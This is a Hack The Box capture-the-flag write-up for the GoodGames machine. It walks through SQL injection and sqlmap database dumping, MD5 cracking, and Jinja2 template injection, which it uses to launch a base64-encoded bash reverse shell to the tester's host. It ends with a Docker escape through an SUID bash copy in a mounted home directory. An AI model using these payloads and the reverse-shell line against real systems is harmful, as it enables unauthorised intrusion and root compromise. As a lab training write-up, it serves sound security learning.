@@ -1,0 +1,385 @@
+---
+title: GoodGames Writeup - Hack The Box
+description: Exploiting SQL injection and SSTI vulnerabilities for initial access, then using Docker escape for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-08
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local$ sudo nmap -sV -sC 10.129.44.246
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-05 23:26 EEST
+Nmap scan report for 10.129.44.246
+Host is up (0.061s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.51
+|_http-title: GoodGames | Community and Store
+|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
+Service Info: Host: goodgames.htb
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 789.44 seconds
+```
+
+The web app is the following: ![Web app homepage](/images/blog/goodgames/20251005234434.png)
+
+The "Store" button redirects us to `/coming-soon`: ![Coming soon page](/images/blog/goodgames/20251005234606.png)
+It doesn't make any requests when you submit it.
+
+There's also a login popup: ![Login popup](/images/blog/goodgames/20251005234731.png)
+it makes the following `POST` request: ![Login request](/images/blog/goodgames/20251005234917.png)
+Even though it returns `200`, the webpage shows `500 Internal Error`.
+
+The `/forgot-password` page shows the following: ![Forgot password page](/images/blog/goodgames/20251006000849.png)
+and makes the following `POST` request: ![Forgot password request](/images/blog/goodgames/20251006000910.png)
+
+Creating an account redirects us to `/profile`: ![Profile page](/images/blog/goodgames/20251006002650.png)
+Nothing too interesting here for now.
+
+Let's fuzz for paths:
+```console title="Directory fuzzing"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.129.44.246/FUZZ -ic -fs 9265
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.44.246/FUZZ
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 9265
+________________________________________________
+
+                        [Status: 200, Size: 85107, Words: 29274, Lines: 1735, Duration: 58ms]
+login                   [Status: 200, Size: 9294, Words: 2101, Lines: 267, Duration: 65ms]
+blog                    [Status: 200, Size: 44212, Words: 15590, Lines: 909, Duration: 380ms]
+profile                 [Status: 200, Size: 9267, Words: 2093, Lines: 267, Duration: 1258ms]
+signup                  [Status: 200, Size: 33387, Words: 11042, Lines: 728, Duration: 1224ms]
+logout                  [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 88ms]
+forgot-password         [Status: 200, Size: 32744, Words: 10608, Lines: 730, Duration: 84ms]
+coming-soon             [Status: 200, Size: 10524, Words: 2489, Lines: 287, Duration: 82ms]
+:: Progress: [87651/87651] :: Job [1/1] :: 80 req/sec :: Duration: [0:08:39] :: Errors: 0 ::
+```
+If you visit a path that doesn't exist, it will keep returning `200` but show `404` on the screen. That's why I filter them with `-fs`.
+
+Doesn't seem like there's a hidden path. 
+
+### SQL Injection
+We can try playing with the requests.
+![SQL injection attempt](/images/blog/goodgames/20251006001309.png)
+It doesn't let us make a request, so I'll capture a valid request first and then replay it in Caido (or Burp).
+
+Performing a simple SQL injection with the following payload `admin' or 1=1-- -` for the `email` field succeedes:
+```
+admin' or 1=1-- -
+```
+![Successful SQL injection](/images/blog/goodgames/20251006003314.png)
+I copied the cookie and pasted it on my browser to login as `admin` (or intercept a new login attempt and perform the SQLi)
+
+<Callout title="Admin Login" type="info">
+We're not logging in as `admin` because we specified admin in the SQL query. The main reason is because the first rows are usually for admin users, so if we pick the first row, `rows[0]`, it's highly likely that it's an admin.
+</Callout>
+
+### Admin Panel
+The admin user has an extra cog icon at the top right: ![Admin cog icon](/images/blog/goodgames/20251008001103.png)
+
+Pressing it tries to redirect us to `internal-administration.goodgames.htb`, so we add it to the `/etc/hosts` file.
+
+After that, we refresh the website and see the following: ![Admin panel login](/images/blog/goodgames/20251008001522.png)
+
+It makes the following request: ![Admin panel request](/images/blog/goodgames/20251008001848.png)
+and shows "Wrong user or password". We'll leave it at that for now.
+
+### SQLMap
+Since we managed to perform SQLi on the previous form, we might be able to dump the database and look for credentials.
+
+First, save a request to `/login` on the file `goodgames.req`:
+```http
+POST /login HTTP/1.1
+Host: goodgames.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Origin: http://goodgames.htb
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://goodgames.htb/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+email=test%40test.com&password=123456
+```
+
+Run `SQLMap`:
+```console title="SQLMap injection point"
+nontas@local$ sqlmap -r goodgames.req
+<SNIP>
+sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@test.com' AND (SELECT 5078 FROM (SELECT(SLEEP(5)))OeRh) AND 'SVUD'='SVUD&password=123456
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: email=test@test.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178627871,0x4946465572696668716b6154666d6f434a6d6c5a5a58617a5157544d706b5a505046755265525561,0x716b6a6b71)-- -&password=123456
+---
+[00:29:38] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+```
+
+List databases:
+```console title="Database enumeration"
+nontas@local$ sqlmap -r goodgames.req -dbs
+[00:31:46] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] main
+```
+
+List tables within `main` DB:
+```console title="Table enumeration"
+nontas@local$ sqlmap -r goodgames.req -D main --tables
+[00:32:15] [INFO] fetching tables for database: 'main'
+Database: main
+[3 tables]
++---------------+
+| user          |
+| blog          |
+| blog_comments |
++---------------+
+```
+
+Get all records inside `user` table:
+```console title="User table dump"
+nontas@local$ sqlmap -r goodgames.req -D main -T user --dump
+Database: main
+Table: user
+[1 entry]
++----+---------------------+--------+----------------------------------+
+| id | email               | name   | password                         |
++----+---------------------+--------+----------------------------------+
+| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec |
++----+---------------------+--------+----------------------------------+
+```
+
+## Initial Foothold
+### Password Cracking
+This is an `MD5` hash, so we'll use either online tools like [CrackStation](https://crackstation.net/) or `John The Ripper`:
+```console title="Hash cracking"
+nontas@local$ echo "2b22337f218b2d82dfc3b6f77e7cb8ec" > hash.txt
+nontas@local$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 ASIMD 4x2])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+superadministrator (?)
+1g 0:00:00:00 DONE (2025-10-08 00:38) 2.941g/s 10224Kp/s 10224Kc/s 10224KC/s superc2395..super20girl
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+```
+the password found is `superadministrator`.
+
+Use `admin:superadministrator` to login at the panel found at `internal-administration.goodgames.htb`: ![Admin panel logged in](/images/blog/goodgames/20251008004848.png)
+
+### SSTI
+Going to the `Settings` we see that we can modify our profile: ![Profile settings](/images/blog/goodgames/20251008005156.png)
+
+Since this is a Python web app, we can try performing `SSTI (Server Side Template Injection)`.
+
+First, we'll use the following string on the `Full Name` field:
+```txt
+${{<%[%'"}}%\.
+```
+
+It causes an `Internal Server Error`, so **it is vulnerable to SSTI:** ![SSTI error](/images/blog/goodgames/20251008005428.png)
+
+In order to find the template engine used:
+1. Start with `{7*7}` => Shows `{7*7}` back to us
+2. Now submit `{{7*7}}` => Shows `49`
+3. Submit `{{7*'7'}}` => Shows `7777777`
+So the template engine used is `Jinja2`.
+
+### Reverse Shell
+
+We'll use the following reverse shell found [here](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#reverse-shell), base64 encoded:
+```console title="Base64 encoding"
+nontas@local$ echo -n "bash -i >& /dev/tcp/10.10.14.78/1234 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC8xMjM0IDA+JjE=
+```
+
+To exploit the SSTI vulnerability, we'll use [this](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#exploit-the-ssti-by-calling-ospopenread) payload:
+```jinja
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+but instead of running `id`, we'll run the base64 encoded command:
+```jinja
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC8xMjM0IDA+JjE=${IFS}|base64${IFS}-d${IFS}|bash').read() }}
+```
+
+<Callout title="IFS Variable" type="info">
+`{IFS}` is replaced by a space
+</Callout>
+
+Once we run it, we get a reverse shell connection. Upgrade the shell and get the user flag:
+```console title="Shell upgrade"
+root@3a453ab39d3d:/backend# id
+uid=0(root) gid=0(root) groups=0(root)
+root@3a453ab39d3d:/backend# python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+root@3a453ab39d3d:/backend# ^Z
+[1]  + 26869 suspended  nc -lnvp 1234
+[Oct 08, 2025 - 12:11:45 (EEST)] exegol-htb-lab /workspace # stty raw -echo;fg
+root@3a453ab39d3d:/backend# ls /home
+augustus
+root@3a453ab39d3d:/backend# cat /home/augustus/user.txt
+```
+
+<Callout title="Container Access" type="info">
+We're `root` inside a docker container.
+</Callout>
+
+## Privilege Escalation via Docker Escape
+We can confirm we're in a docker container by listing the contents in the home directory:
+```console title="User directory listing"
+root@3a453ab39d3d:/home/augustus# ls -la
+total 24
+drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 .
+drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
+lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
+-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
+-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
+-rw-r----- 1 root 1000   33 Oct  7 20:10 user.txt
+```
+instead of `augustus`, is it showing `1000`. This means that user's home directory is **mounted** inside the docker container from the main system.
+
+We can confirm that by running `mount`:
+```console title="Mount information"
+root@3a453ab39d3d:/home/augustus# mount
+<SNIP>
+/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
+/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
+/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
+/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
+<SNIP>
+```
+
+Listing the network adapters, we see that the container's IP is `172.19.0.2`:
+```console title="Network configuration"
+root@3a453ab39d3d:/home/augustus# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
+        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
+        RX packets 4092  bytes 702102 (685.6 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3468  bytes 3230774 (3.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8  bytes 464 (464.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 464 (464.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+The first address (`172.19.0.1` ) is usually assigned to the host system, so `172.19.0.2` might be the internal Docker IP address of the host.
+
+Since we don't have `nmap`, let's scan for open ports on the host with a small bash script like the following:
+```bash
+for PORT in {0..1000}; do
+  timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null &&
+  echo "port $PORT is open"
+done
+```
+
+```console title="Port scanning"
+root@3a453ab39d3d:/home/augustus# for PORT in {0..1000}; do
+>   timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null &&
+>   echo "port $PORT is open"
+> done
+port 22 is open
+port 80 is open
+```
+SSH is listening since port 22 is open.
+
+Let's attempt to connect with the credentials `augustus:superadministrator`:
+```console title="SSH connection"
+root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
+augustus@172.19.0.1's password:
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+augustus@GoodGames:~$ id
+uid=1000(augustus) gid=1000(augustus) groups=1000(augustus)
+```
+we successfully got access as user `augustus`.
+
+If we copy any files to `/home/augustus`, these files will also be available inside the docker container. Since we're `root` inside the container, we can change the privileges from there, and the changes will be reflected back to the actual host.
+
+```console title="File manipulation"
+augustus@GoodGames:~$ cp /bin/bash .
+augustus@GoodGames:~$ exit
+logout
+Connection to 172.19.0.1 closed.
+root@3a453ab39d3d:/home/augustus# ls
+bash  user.txt
+root@3a453ab39d3d:/home/augustus# chown root:root bash
+root@3a453ab39d3d:/home/augustus# chmod 4755 bash
+```
+
+<Callout title="SUID Privilege" type="info">
+We changed the owner and group to `root`, and we also set the SUID bit (the 4 on 4755).
+</Callout>
+
+Now we should be able to run `bash` as the `root` user on the host:
+```console title="Root escalation"
+root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
+augustus@172.19.0.1's password:
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Oct  8 13:44:19 2025 from 172.19.0.2
+augustus@GoodGames:~$ ls -la bash
+-rwsr-xr-x 1 root root 1234376 Oct  8 13:45 bash
+augustus@GoodGames:~$ ./bash -p
+bash-5.1# id
+uid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)
+bash-5.1# ls /root
+root.txt
+bash-5.1# cat /root/root.txt
+```
+and we get the root flag.
+
+We've successfully completed the **GoodGames** machine!
